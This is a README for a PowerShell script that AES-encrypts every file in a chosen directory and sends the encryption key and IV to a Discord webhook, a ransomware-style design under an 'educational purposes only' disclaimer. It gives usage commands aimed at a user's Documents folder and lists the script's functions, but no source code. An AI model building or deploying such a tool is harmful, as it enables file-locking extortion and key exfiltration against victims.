# PowerShell E-D Script README
![](https://img.shields.io/badge/-PowerShell-blue)

## ⚠️ **WARNING: This script is meant for educational purposes ONLY. Misuse of this script may violate laws and regulations. Use it responsibly and at your own risk.** ⚠️

## Overview

This PowerShell script provides a simple mechanism to encrypt or decrypt files using AES encryption. The function `E-D` takes various parameters to encrypt or decrypt files within a given directory.

The script also sends the encryption key and initialization vector (IV) to a Discord webhook, thereby allowing remote access to the decryption key. 

**Note: Transmitting encryption keys over the internet is generally not secure and should not be done in production.**

## Function Parameters

- `-e` : Specifies encryption mode. (Mandatory for encryption)
- `-d` : Specifies decryption mode. (Mandatory for decryption)
- `-p` : Specifies the path where the target files are located. (Mandatory for both encryption and decryption)
- `-wh` : Specifies the Discord webhook URL. (Mandatory for encryption)

## Usage Examples

### To Encrypt:

```PowerShell
E-D -e -p "C:\Users\$env:USERNAME\Documents\test\" -wh "YOUR WEBHOOK HERE"
```

### To Decrypt:

```PowerShell
E-D -d -p "C:\Users\$env:USERNAME\Documents\test\"
```

## Functions Inside the Script

- `SendToDiscord`: Sends a message to the specified Discord webhook.
- `EncryptFile`: Encrypts a given file.
- `DecryptFile`: Decrypts a given file.
